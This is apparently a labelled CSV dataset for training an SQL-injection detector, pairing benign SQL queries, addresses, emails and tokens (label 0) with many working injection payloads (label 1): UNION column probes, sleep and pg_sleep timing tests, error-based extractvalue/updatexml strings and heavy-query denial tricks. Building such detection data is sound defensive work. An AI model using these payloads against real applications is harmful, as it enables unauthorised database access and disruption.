Sentence,Label,Processed_Sentence
SELECT AVG ( copy )  FROM chose  SELECT SUM ( atom ) ,0.0,select avg ( copy )  from chose  select sum ( atom ) 
" SELECT * FROM possibly ORDER BY concerned ASC, could DESC",0.0," select * from possibly order by concerned asc, could desc"
"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",1.0,"0""  )   as xwnu where 0  =  0 union all select null,null,null,null,null,null--"
SELECT fallen ( s )  FROM roll,0.0,select fallen ( s )  from roll
SELECT TOP 3 * FROM popular WHERE blow = 'scared',0.0,select top 0 * from popular where blow = 'scared'
"1%""   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""%""  =  """,1.0,"0%""   )    )    and 0  =    (  select count  (  *  )   from rdb$fields as t0,rdb$types as t0,rdb$collations as t0,rdb$functions as t0  )   and    (    (   ""%""  =  """
"1' where 6853  =  6853 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1.0,"0' where 0  =  0 or exp  (  ~  (  select * from   (  select concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,0x0   )    )   x   )    )   --"
SELECT * FROM climate WHERE oldest BETWEEN thin09/01/1996behind AND apart15/31/1996came,0.0,select * from climate where oldest between thin0/0/0behind and apart0/0/0came
"SELECT column1 , column2, ... FROM table_name WHERE NOT condition ;",0.0,"select column0 , column0, ... from table_name where not condition ;"
"1""  )   as ufai where 9673  =  9673",1.0,"0""  )   as ufai where 0  =  0"
"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1.0,"0' and 0  =    (  select count  (  *  )   from generate_series  (  0,0   )    )   "
"carretera nacional 139, 9?a",0.0,"carretera nacional 0, 0?a"
"-2790'  )   as xhct where 5756  =  5756 union all select 5756,5756#",1.0,"-0'  )   as xhct where 0  =  0 union all select 0,0#"
"1   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  6583  =  6583",1.0,"0   )    )     )   or char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )    =  regexp_substring  (  repeat  (  right  (  char  (  0  )  ,0  )  ,0  )  ,null  )   and    (    (     (  0  =  0"
SELECT AVG ( happen ) FROM unusual,0.0,select avg ( happen ) from unusual
SELECT Count ( * )  AS basket,0.0,select count ( * )  as basket
"   SELECT adult, just, slowFROM agree WHERE go  IS NOT NULL",0.0,"   select adult, just, slowfrom agree where go  is not null"
"SELECT column1 , column2, ... FROM table_name WHERE condition ;",0.0,"select column0 , column0, ... from table_name where condition ;"
DELETE FROM if,0.0,delete from if
1'  )   and 7533  =  7533,1.0,0'  )   and 0  =  0
SELECT additional ( s )  FROM depend UNION,0.0,select additional ( s )  from depend union
"1""  )   where 1614  =  1614 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1.0,"0""  )   where 0  =  0 or extractvalue  (  0,concat  (  0x0c,0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0   )    )   --"
03nte99era,0.0,0nte0era
"-4915' union all select 1928,1928,1928,1928#",1.0,"-0' union all select 0,0,0,0#"
"  SELECT * FROM table WHERE obtain IN  ( 'became', 'vowel', 'completely' )  ",0.0,"  select * from table where obtain in  ( 'became', 'vowel', 'completely' )  "
"INSERT INTO fire ( very, shout, string, lips, dollar, was )  VALUES  ( 'completely', 'flow'. border', 'acres', 'jungle', 'captain', 'blew' )  ",0.0,"insert into fire ( very, shout, string, lips, dollar, was )  values  ( 'completely', 'flow'. border', 'acres', 'jungle', 'captain', 'blew' )  "
5765730000000000,0.0,0
"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1.0,"0%"" rlike   (  select * from   (  select  (  sleep  (  0   )    )     )  vwyq  )  #"
DELETE FROM married WHERE suppose = 'local',0.0,delete from married where suppose = 'local'
SELECT * FROM look WHERE specific = 'such' FETCH FIRST 3 ROWS ONLY,0.0,select * from look where specific = 'such' fetch first 0 rows only
SELECT * FROM half WHERE    NOT paper = 'crack',0.0,select * from half where    not paper = 'crack'
1'   )    )    as oyad where 7161  =  7161 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1.0,0'   )    )    as oyad where 0  =  0 and 0  =    (  'qqpjq'||  (  select case 0 when 0 then 0 else 0 end from rdb$database  )  ||'qzvzq'  )  --
"virgen del valle, 40",0.0,"virgen del valle, 0"
"select * from generate_series  (  4592,4592,case when   (  4592  =  4592  )   then 1 else 0 end  )   limit 1--",1.0,"select * from generate_series  (  0,0,case when   (  0  =  0  )   then 0 else 0 end  )   limit 0--"
40146763x,0.0,0x
-1485'  )   or   (  2056  =  4008  )  *4008 and   (  'vphj'  =  'vphj,1.0,-0'  )   or   (  0  =  0  )  *0 and   (  'vphj'  =  'vphj
""" or pg_sleep  (  __TIME__  )  --",1.0,""" or pg_sleep  (  __time__  )  --"
SELECT * FROM build WHERE fed NOT LIKE '[happen]%',0.0,select * from build where fed not like '[happen]%'
1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,1.0,0'   )    )    or sleep  (  0  )   and    (    (   'uzhd' like 'uzhd
1'||  (  select 'uedy' where 8816  =  8816,1.0,0'||  (  select 'uedy' where 0  =  0
1' or sleep  (  5  )  #,1.0,0' or sleep  (  0  )  #
"-6457 where 1764  =  1764 union all select 1764,1764,1764,1764,1764,1764,1764,1764--",1.0,"-0 where 0  =  0 union all select 0,0,0,0,0,0,0,0--"
"1""   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""gfwz""  =  ""gfwz",1.0,"0""   )    )     )   and   (  select 0*  (  if   (    (   select * from   (  select concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,0x0   )    )   s  )  , 0, 0   )    )     )   and    (    (     (  ""gfwz""  =  ""gfwz"
"-6108'  )   union all select 2519,2519,2519,2519--",1.0,"-0'  )   union all select 0,0,0,0--"
marshaus,0.0,marshaus
SELECT * FROM caught FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM floating,0.0,select * from caught fetch first 0 percent rows onlyselect top 0 * from floating
"-5706""   )    )    union all select 2013,2013,2013,2013#",1.0,"-0""   )    )    union all select 0,0,0,0#"
1 where 8135  =  8135,1.0,0 where 0  =  0
lora@rocofer.jobs,0.0,lora@rocofer.jobs
o1e6e2d6,0.0,o0e0e0d0
17621392b,0.0,0b
SELECT * FROM my WHERE NOT of = 'minerals'  AND NOT people = 'reader',0.0,select * from my where not of = 'minerals'  and not people = 'reader'
SELECT AVG ( lying ) FROM be,0.0,select avg ( lying ) from be
1' where 5060  =  5060,1.0,0' where 0  =  0
"1""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""wile"" like ""wile",1.0,"0""   )    )     )   and char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )    =  regexp_substring  (  repeat  (  right  (  char  (  0  )  ,0  )  ,0  )  ,null  )   and    (    (     (  ""wile"" like ""wile"
" select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1",1.0," select * from users where id  =  0 or !<@ union select 0,version  (    )   -- 0"
"paratge lila 30, 10?c",0.0,"paratge lila 0, 0?c"
SELECT sugar ( s FROM opportunity RIGHT JOIN,0.0,select sugar ( s from opportunity right join
aguadulce,0.0,aguadulce
SELECT * FROM officer WHERE standard BETWEEN early09/01/1996influence AND relationship15/31/1996duty,0.0,select * from officer where standard between early0/0/0influence and relationship0/0/0duty
torre de arcas,0.0,torre de arcas
SELECT COUNT ( wrappedID ) FROM upward,0.0,select count ( wrappedid ) from upward
"-5225'   )    )    as zats where 5629  =  5629 union all select 5629,5629,5629,5629,5629--",1.0,"-0'   )    )    as zats where 0  =  0 union all select 0,0,0,0,0--"
1'||  (  select 'ezse' from dual where 3821  =  3821,1.0,0'||  (  select 'ezse' from dual where 0  =  0
"1"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""krtr"" like ""krtr",1.0,"0"" and   (  select 0 from  (  select count  (  *  )  ,concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )   x from information_schema.character_sets group by x  )  a  )   and ""krtr"" like ""krtr"
SELECT Count ( * )  AS leave,0.0,select count ( * )  as leave
"-7235""  )   union all select 4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#",1.0,"-0""  )   union all select 0,0,0,0,0,0,0,0,0,0#"
SELECT COUNT ( tent ) FROM practical,0.0,select count ( tent ) from practical
SELECT AVG ( funny ) FROM around,0.0,select avg ( funny ) from around
armintario,0.0,armintario
choclo,0.0,choclo
SELECT TOP 3 * FROM ear SELECT * FROM about 3SELECT * FROM badly,0.0,select top 0 * from ear select * from about 0select * from badly
SELECT * FROM broke WHERE mill NOT LIKE '[certain]%',0.0,select * from broke where mill not like '[certain]%'
"1  )   as bfuy where 3879  =  3879 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1.0,"0  )   as bfuy where 0  =  0 and char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  0  )  ||char  (  0  )  ||char  (  0  )  ,null  )  ,0  )  ,0  )  ,null  )  --"
SELECT * FROM percent WHERE include = 'race'  OR needs = 'there',0.0,select * from percent where include = 'race'  or needs = 'there'
" select * from users where id  =  1 union select +!<1,version  (    )   -- 1",1.0," select * from users where id  =  0 union select +!<0,version  (    )   -- 0"
"  SELECT Orders.smallrID, Employees.native, Employees.yourself FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.butID ORDER BY Orders.burstID",0.0,"  select orders.smallrid, employees.native, employees.yourself from ordersright join employees on orders.employeeid  =  employees.butid order by orders.burstid"
1 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1.0,0 and 0 in    (    (   char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +  (  select   (  case when   (  0  =  0  )   then char  (  0  )   else char  (  0  )   end   )    )   +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0   )    )     ) 
8847,0.0,0
" select * from users where id  =  1 or 1#"", union select 'a',version  (    )   -- 1",1.0," select * from users where id  =  0 or 0#"", union select 'a',version  (    )   -- 0"
marla,0.0,marla
1'   )    )    as dqby where 9256  =  9256,1.0,0'   )    )    as dqby where 0  =  0
end and   (  'hmtt' like 'hmtt,1.0,end and   (  'hmtt' like 'hmtt
villalpando iturbide,0.0,villalpando iturbide
SELECT * FROM farm WHERE split NOT BETWEEN 'settlers' AND 'flat',0.0,select * from farm where split not between 'settlers' and 'flat'
"-8487'  )   where 9655  =  9655 union all select 9655,9655,9655,9655,9655,9655,9655,9655,9655,9655--",1.0,"-0'  )   where 0  =  0 union all select 0,0,0,0,0,0,0,0,0,0--"
SELECT * FROM jack WHERE view LIKE '%knowledge%',0.0,select * from jack where view like '%knowledge%'
1'  )   and   (  1471  =  7892  )  *7892 and   (  'kkok' like 'kkok,1.0,0'  )   and   (  0  =  0  )  *0 and   (  'kkok' like 'kkok
"1""   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""umne"" like ""umne",1.0,"0""   )    )     )   and 0  =    (  'qqpjq'||  (  select case 0 when 0 then 0 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""umne"" like ""umne"
select case when 3920  =  4402 then 1 else null end--,1.0,select case when 0  =  0 then 0 else null end--
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'frpo' like 'frpo",1.0,"call regexp_substring  (  repeat  (  right  (  char  (  0  )  ,0  )  ,0  )  ,null  )   and    (    (   'frpo' like 'frpo"
lucila2,0.0,lucila0
"1' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'lwir' like 'lwir",1.0,"0' and 0  =    (  select count  (  *  )   from rdb$fields as t0,rdb$types as t0,rdb$collations as t0,rdb$functions as t0  )   and 'lwir' like 'lwir"
 UPDATE shells SET shop = 'serious'WHERE loss = 'process',0.0, update shells set shop = 'serious'where loss = 'process'
1' in boolean mode  )   and 4457  =  3885#,1.0,0' in boolean mode  )   and 0  =  0#
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  +'",1.0,"select count  (  *  )   from sysibm.systables as t0,sysibm.systables as t0,sysibm.systables as t0  )  +'"
SELECT * FROM hit WHERE company  BETWEEN 10 AND 20,0.0,select * from hit where company  between 0 and 0
castellgal,0.0,castellgal
SELECT chemical ( s )  FROM coat UNION,0.0,select chemical ( s )  from coat union
"-7531'   )    )     )   union all select 6900,6900,6900,6900,6900,6900,6900,6900,6900#",1.0,"-0'   )    )     )   union all select 0,0,0,0,0,0,0,0,0#"
c09so18,0.0,c0so0
11615910j,0.0,0j
"INSERT INTO aloud  ( recognize, strange, range )  VALUES  ( 'yesterday', 'rough', 'failed' )  ",0.0,"insert into aloud  ( recognize, strange, range )  values  ( 'yesterday', 'rough', 'failed' )  "
rousseau,0.0,rousseau
1  )   or sleep  (  5  ) ,1.0,0  )   or sleep  (  0  ) 
"1  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",1.0,"0  )    (  select   (  case when   (  0  =  0  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  0  )  ||char  (  0  )  ||char  (  0  )  ,null  )  ,0  )  ,0  )  ,null  )   else char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )   end  )   from   (  values  (  0   )    )     )  "
1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1.0,0' or   (  select * from   (  select  (  sleep  (  0   )    )     )  sddo  )  #
"1%"" or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,1.0,"0%"" or char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  0  )  ||char  (  0  )  ||char  (  0  )  ,null  )  ,0  )  ,0  )  ,null  )   and ""%""  =  """
"  SELECT canal,nose FROM empty WHERE plastic = 'eleven' UNION SELECT steep, cattle FROM heart",0.0,"  select canal,nose from empty where plastic = 'eleven' union select steep, cattle from heart"
"iif  (  6307  =  2459,1,1/0  )  ",1.0,"iif  (  0  =  0,0,0/0  )  "
1'  )   as akvn where 8669  =  8669,1.0,0'  )   as akvn where 0  =  0
DELETE FROM clothes WHERE string = 'sail',0.0,delete from clothes where string = 'sail'
"-5130'   )    )    union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218--",1.0,"-0'   )    )    union all select 0,0,0,0,0,0,0,0,0,0--"
"1'+  (  select fhbk where 2570  =  2570 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",1.0,"0'+  (  select fhbk where 0  =  0 and 0  =    (  select count  (  *  )   from all_users t0,all_users t0,all_users t0,all_users t0,all_users t0   )    )   +'"
2641900000000000,0.0,0
"-1407 where 1186  =  1186 union all select 1186,1186,1186,1186,1186--",1.0,"-0 where 0  =  0 union all select 0,0,0,0,0--"
"c/ benasau, 196, 10?h",0.0,"c/ benasau, 0, 0?h"
"  SELECT centID AS ID, becoming AS tank FROM decide",0.0,"  select centid as id, becoming as tank from decide"
SELECT * FROM mouth WHERE    NOT current = 'hall',0.0,select * from mouth where    not current = 'hall'
"1'||  (  select 'votg' where 5105  =  5105 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1.0,"0'||  (  select 'votg' where 0  =  0 or 0  =    (  select count  (  *  )   from generate_series  (  0,0   )    )   --"
"1'   )    )    as kwre where 7775  =  7775 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1.0,"0'   )    )    as kwre where 0  =  0 and 0  =    (  select count  (  *  )   from rdb$fields as t0,rdb$types as t0,rdb$collations as t0,rdb$functions as t0  )  --"
"||  (  elt  (  -3+5,bin  (  15  )  ,ord  (  10  )  ,hex  (  char  (  45   )    )      )    )   ",1.0,"||  (  elt  (  -0+0,bin  (  0  )  ,ord  (  0  )  ,hex  (  char  (  0   )    )      )    )   "
select sleep  (  5  )   and    (    (     (  'iwwa' like 'iwwa,1.0,select sleep  (  0  )   and    (    (     (  'iwwa' like 'iwwa
" SELECT * FROM buffalo ORDER BY lost ASC, if DESC",0.0," select * from buffalo order by lost asc, if desc"
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""uidb"" like ""uidb",1.0,"select count  (  *  )   from rdb$fields as t0,rdb$types as t0,rdb$collations as t0,rdb$functions as t0 and    (    (   ""uidb"" like ""uidb"
SELECT * FROM anywhere WHERE clothes = 'press'  AND City = 'wagon',0.0,select * from anywhere where clothes = 'press'  and city = 'wagon'
"-7678   )    )     )   union all select 2622,2622,2622,2622,2622,2622,2622,2622--",1.0,"-0   )    )     )   union all select 0,0,0,0,0,0,0,0--"
SELECT * FROM shadow ORDER BY present DESC,0.0,select * from shadow order by present desc
DELETE FROM somehow WHERE factor = 'fruit',0.0,delete from somehow where factor = 'fruit'
SELECT Count ( * )  AS sugar,0.0,select count ( * )  as sugar
1'  )   as ihsc where 3978  =  3978,1.0,0'  )   as ihsc where 0  =  0
"-5849  )   union all select 6168,6168,6168,6168,6168,6168,6168,6168#",1.0,"-0  )   union all select 0,0,0,0,0,0,0,0#"
elsen@whitehat.td,0.0,elsen@whitehat.td
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'wusq'  =  'wusq",1.0,"select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0 and    (    (   'wusq'  =  'wusq"
"sierra santos, 71, 6?g",0.0,"sierra santos, 0, 0?g"
1'+  (  select brgo where 9100  =  9100 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1.0,0'+  (  select brgo where 0  =  0 or 0  =    (  select 0 from pg_sleep  (  0   )    )   --
"1%""   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1.0,"0%""   )    )    or 0  =    (  select count  (  *  )   from rdb$fields as t0,rdb$types as t0,rdb$collations as t0,rdb$functions as t0  )  --"
"1'+  (  select 'hoqt' where 4877  =  4877 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1.0,"0'+  (  select 'hoqt' where 0  =  0 or 0  =    (  select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0  )  --"
1'||  (  select 'xglm' from dual where 3556  =  3556 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1.0,0'||  (  select 'xglm' from dual where 0  =  0 or 0  =    (  select 0 from pg_sleep  (  0   )    )   --
cangrenarse,0.0,cangrenarse
1' where 1153  =  1153 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1.0,0' where 0  =  0 or   (  select * from   (  select  (  sleep  (  0   )    )     )  ydpu  )  --
arimany aguila,0.0,arimany aguila
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 715 )  ORDER BY meta_id ASC",0.0,"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 0 )  order by meta_id asc"
"1""  )   as pkkx where 6716  =  6716 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1.0,"0""  )   as pkkx where 0  =  0 and updatexml  (  0,concat  (  0x0e,0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0  )  ,0  )  --"
SELECT TOP 3 * FROM sell,0.0,select top 0 * from sell
SELECT TOP 3 * FROM report SELECT * FROM pleasure 3SELECT * FROM farm,0.0,select top 0 * from report select * from pleasure 0select * from farm
"1' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'nazb'  =  'nazb",1.0,"0' or   (  select 0*  (  if   (    (   select * from   (  select concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,0x0   )    )   s  )  , 0, 0   )    )     )   and 'nazb'  =  'nazb"
natala,0.0,natala
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""unju""  =  ""unju",1.0,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  0/0   )    )      )    )    and   (  ""unju""  =  ""unju"
85amo,0.0,0amo
SELECT * FROM flat FETCH FIRST 3 ROWS ONLY,0.0,select * from flat fetch first 0 rows only
gavald,0.0,gavald
-1603'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'abmo'  =  'abmo,1.0,-0'   )    )    or 0  =    (  'qqpjq'||  (  select case 0 when 0 then 0 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'abmo'  =  'abmo
"1""   )    )    as mlid where 1047  =  1047 union all select null,null#",1.0,"0""   )    )    as mlid where 0  =  0 union all select null,null#"
SELECT TOP 50 PERCENT * FROM bottle SELECT * FROM addition FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM son,0.0,select top 0 percent * from bottle select * from addition fetch first 0 percent rows onlyselect top 0 * from son
"-3581'||  (  select 'uxmh' from dual where 8954  =  8954 union all select 8954,8954,8954,8954,8954,8954#",1.0,"-0'||  (  select 'uxmh' from dual where 0  =  0 union all select 0,0,0,0,0,0#"
germe,0.0,germe
"-4589""  )   union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",1.0,"-0""  )   union all select 0,0,0,0,0,0,0,0,0,0--"
"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",1.0,"-0'||  (  select 'ssld' from dual where 0  =  0 union all select 0,0,0,0,0#"
1'||  (  select 'eyiy' from dual where 8127  =  8127,1.0,0'||  (  select 'eyiy' from dual where 0  =  0
"plaza minayo, 2",0.0,"plaza minayo, 0"
cusanelli@wdsl.ao,0.0,cusanelli@wdsl.ao
"ronda bellesguard 125, 11?c",0.0,"ronda bellesguard 0, 0?c"
-6912' in boolean mode  )   union all select 6012--,1.0,-0' in boolean mode  )   union all select 0--
"1""   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and ""cbck"" like ""cbck",1.0,"0""   (  select   (  case when   (  0  =  0  )   then regexp_substring  (  repeat  (  right  (  char  (  0  )  ,0  )  ,0  )  ,null  )   else char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )   end  )   from information_schema.system_users  )   and ""cbck"" like ""cbck"
select case when 6558  =  4327 then 1 else null end--,1.0,select case when 0  =  0 then 0 else null end--
"1   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1.0,"0   )    )     )   or 0  =    (  select count  (  *  )   from all_users t0,all_users t0,all_users t0,all_users t0,all_users t0  )  --"
"llobregat 130,",0.0,"llobregat 0,"
SELECT * FROM swam WHERE pencil BETWEEN 'rays' AND 'according',0.0,select * from swam where pencil between 'rays' and 'according'
1'  )   as gxfu where 9676  =  9676,1.0,0'  )   as gxfu where 0  =  0
"1%"" union all select null,null,null,null,null,null,null#",1.0,"0%"" union all select null,null,null,null,null,null,null#"
SELECT limited ( s )  FROM found UNION ALL,0.0,select limited ( s )  from found union all
SELECT AVG ( edge ) FROM wheat SELECT SUM ( sing ) ,0.0,select avg ( edge ) from wheat select sum ( sing ) 
"1"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1.0,"0"" and 0  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  0/0   )    )      )    )   --"
1  )   or sleep  (  __TIME__  )  #,1.0,0  )   or sleep  (  __time__  )  #
SELECT MIN ( party )  AS writing FROM verb,0.0,select min ( party )  as writing from verb
SELECT frog,0.0,select frog
"1%""   )    )    or sleep  (  5  )  #",1.0,"0%""   )    )    or sleep  (  0  )  #"
SELECT AVG ( police )  FROM sang  SELECT SUM ( known ) ,0.0,select avg ( police )  from sang  select sum ( known ) 
SELECT AVG ( movie )  FROM whose  SELECT SUM ( rain ) ,0.0,select avg ( movie )  from whose  select sum ( rain ) 
47361,0.0,0
cabral_crowther@frioelectric.br,0.0,cabral_crowther@frioelectric.br
"SELECT * FROM call WHERE fix BETWEEN ""whether"" AND    ""locate""",0.0,"select * from call where fix between ""whether"" and    ""locate"""
SELECT * FROM cut,0.0,select * from cut
SELECT * FROM require WHERE headed = 'gravity'  OR writing = 'game',0.0,select * from require where headed = 'gravity'  or writing = 'game'
"SELECT NULLIF ( ""Hello"", ""world"" ) ;",0.0,"select nullif ( ""hello"", ""world"" ) ;"
SELECT foot ( s )  FROM example,0.0,select foot ( s )  from example
yegorova@onlinegratis.aq,0.0,yegorova@onlinegratis.aq
"1   )    )    as kycl where 8008  =  8008 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1.0,"0   )    )    as kycl where 0  =  0 or 0  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  0/0   )    )      )    )   --"
"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",1.0,"0' in boolean mode  )   union all select null,null,null,null,null,null,null--"
